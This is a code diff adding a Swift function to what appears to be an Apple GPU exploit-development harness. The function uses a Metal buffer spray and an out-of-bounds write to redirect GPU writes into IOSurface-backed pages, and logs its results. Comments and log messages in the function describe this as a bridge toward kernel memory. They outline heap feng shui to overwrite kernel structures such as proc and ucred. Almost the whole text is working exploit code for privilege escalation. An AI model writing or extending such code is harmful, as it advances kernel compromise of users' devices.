@@ -3302,3 +3302,156 @@ func runArgBufWrite(log: FuzzLog, completion: @escaping () -> Void) {
         completion()
     }
 }
+
+// ── runIOSurfaceGPUWrite ──────────────────────────────────────────────────────
+// Bridge GPU write primitive to IOSurface-backed physical pages.
+//
+// IOSurface backing memory is mapped in THREE places simultaneously:
+//   1. User CPU VA      (surf.baseAddress)
+//   2. GPU VA           (surfBuf.gpuAddress via makeBuffer(bytesNoCopy:))
+//   3. Kernel VA        (IOSurface kernel object's backing page mapping)
+//
+// If GPU writes to surfVA (== IOSurface backing GPU VA), the write lands on
+// the exact same physical pages the kernel has mapped. CPU can verify via
+// surf.baseAddress. Kernel sees the same mutation.
+//
+// This is the bridge from user-controlled GPU write → kernel-accessible pages.
+// Next step: find IOSurface allocation adjacent to a kernel heap object
+// (proc, ucred, etc.) via heap feng shui → OOB write past IOSurface end
+// into the adjacent kernel struct.
+// ─────────────────────────────────────────────────────────────────────────────
+func runIOSurfaceGPUWrite(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── IOSurface GPU Write ──")
+
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+        let BUF_LEN = 4096
+
+        // Allocate IOSurface with exactly BUF_LEN bytes backing
+        guard let surf = IOSurface(properties: [.allocSize: BUF_LEN]) else {
+            step("✗ IOSurface alloc"); completion(); return
+        }
+        step("✓ IOSurface allocSize=\(surf.allocationSize) baseAddr=\(surf.baseAddress)")
+
+        // Fill IOSurface backing with 0x11 (victim pattern before GPU write)
+        surf.lock(options: .readOnly, seed: nil)
+        surf.baseAddress.initializeMemory(as: UInt8.self, repeating: 0x11, count: BUF_LEN)
+        surf.unlock(options: .readOnly, seed: nil)
+
+        // Wrap IOSurface backing in a no-copy MTLBuffer → gives us its GPU VA
+        // This maps the SAME physical pages into GPU VA space
+        guard let surfBuf = device.makeBuffer(bytesNoCopy: surf.baseAddress,
+                                              length:      BUF_LEN,
+                                              options:     .storageModeShared,
+                                              deallocator: nil) else {
+            step("✗ IOSurface MTLBuffer wrap failed"); completion(); return
+        }
+        let surfVA = surfBuf.gpuAddress
+        step("IOSurface backing GPU VA=0x\(String(surfVA, radix: 16))")
+
+        // srcBuf: GPU reads this (0xBB) and writes the value to IOSurface backing
+        guard let srcBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
+            step("✗ srcBuf alloc"); completion(); return
+        }
+        srcBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
+
+        // Spray: find lo/hi adjacent pair for OOB write into hi[0]
+        var loRef: MTLBuffer?
+        var nextGPUVA: UInt64 = 0
+        var keepAlives: [any MTLBuffer] = []
+        for _ in 0..<2048 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
+                loRef = prev; nextGPUVA = a.gpuAddress; break
+            }
+            keepAlives.append(a)
+        }
+        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16)) next=0x\(String(nextGPUVA, radix: 16))")
+        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
+
+        guard let hi = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
+            step("✗ hi alloc"); completion(); return
+        }
+        step("hi gpuVA=0x\(String(hi.gpuAddress, radix: 16)) \(hi.gpuAddress == nextGPUVA ? "✓" : "⚠ MISMATCH")")
+
+        func oobWrite8(_ off: Int, _ val: UInt64) {
+            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((val >> (bi*8)) & 0xFF) }
+        }
+
+        // OOB adjacency check
+        oobWrite8(0, 0xAAAA_BBBB_CCCC_DDDD)
+        let chk = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
+        step("OOB reach: \(chk == 0xAAAA_BBBB_CCCC_DDDD ? "✓ ADJACENT" : "⚠ NOT ADJACENT")")
+
+        // GPU write kernel (same writeProbe as stage9)
+        let kernSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct AB { device float4* buf; };
+        kernel void writeProbe(device AB*     ab  [[buffer(0)]],
+                               device float4* src [[buffer(1)]]) {
+            ab->buf[0] = src[0];
+        }
+        """
+        guard let lib = try? device.makeLibrary(source: kernSrc, options: nil),
+              let fn  = lib.makeFunction(name: "writeProbe"),
+              let pso = try? device.makeComputePipelineState(function: fn) else {
+            step("✗ writeProbe PSO"); completion(); return
+        }
+
+        // ── OOB hi[0] = surfVA → GPU writes 0xBB to IOSurface physical pages ──
+        step("── OOB lo→hi[0]=surfVA → GPU writes srcBuf(0xBB)→IOSurface backing ──")
+        oobWrite8(0, surfVA)
+        let hiGot = hi.contents().assumingMemoryBound(to: UInt64.self)[0]
+        step("  hi[0]=0x\(String(hiGot, radix: 16)) \(hiGot == surfVA ? "✓ OOB hit" : "⚠ OOB miss")")
+
+        guard let q   = device.makeCommandQueue(),
+              let cb  = q.makeCommandBuffer(),
+              let enc = cb.makeComputeCommandEncoder() else {
+            step("✗ encoder"); completion(); return
+        }
+        enc.setComputePipelineState(pso)
+        enc.setBuffer(hi,     offset: 0, index: 0)
+        enc.setBuffer(srcBuf, offset: 0, index: 1)
+        enc.useResource(surfBuf, usage: .write)
+        enc.useResource(srcBuf,  usage: .read)
+        let t = MTLSize(width: 1, height: 1, depth: 1)
+        enc.dispatchThreads(t, threadsPerThreadgroup: t)
+        enc.endEncoding()
+        cb.commit(); cb.waitUntilCompleted()
+
+        if let err = cb.error as NSError? {
+            step("  FAULT code=\(err.code) \(err.localizedDescription.prefix(100))")
+            step("  AGX rejected GPU write to IOSurface VA — check useResource registration")
+            completion(); return
+        }
+
+        // CPU reads IOSurface backing via surf.baseAddress
+        // If GPU wrote to surfVA (same physical pages), we see 0xBB here
+        surf.lock(options: .readOnly, seed: nil)
+        let surfResult = surf.baseAddress.assumingMemoryBound(to: UInt64.self)[0]
+        let surfBufResult = surfBuf.contents().assumingMemoryBound(to: UInt64.self)[0]
+        surf.unlock(options: .readOnly, seed: nil)
+
+        step("  surf.baseAddress[0]   =0x\(String(surfResult,    radix: 16))")
+        step("  surfBuf.contents()[0] =0x\(String(surfBufResult, radix: 16))")
+
+        if surfResult == 0xBBBBBBBBBBBBBBBB {
+            step("  ★★★ GPU WRITE → IOSurface CONFIRMED")
+            step("  ★ GPU wrote 0xBB to IOSurface physical pages — CPU and kernel see the same mutation")
+            step("  ★ BRIDGE: user GPU write primitive → kernel-shared physical memory")
+            step("  NEXT: heap feng shui — allocate many IOSurfaces, free alternates,")
+            step("         allocate target kernel struct adjacent, overflow past IOSurface end")
+        } else if surfResult == 0x1111111111111111 {
+            step("  ⚠ surf still 0x11 — GPU write landed somewhere else or was blocked")
+            step("  surfBuf.contents()[0]=0x\(String(surfBufResult, radix: 16)) (check if write hit no-copy buffer instead)")
+        } else {
+            step("  ? surfResult=0x\(String(surfResult, radix: 16)) (unexpected partial write?)")
+        }
+
+        step("── IOSurface GPU Write complete ──")
+        completion()
+    }
+}
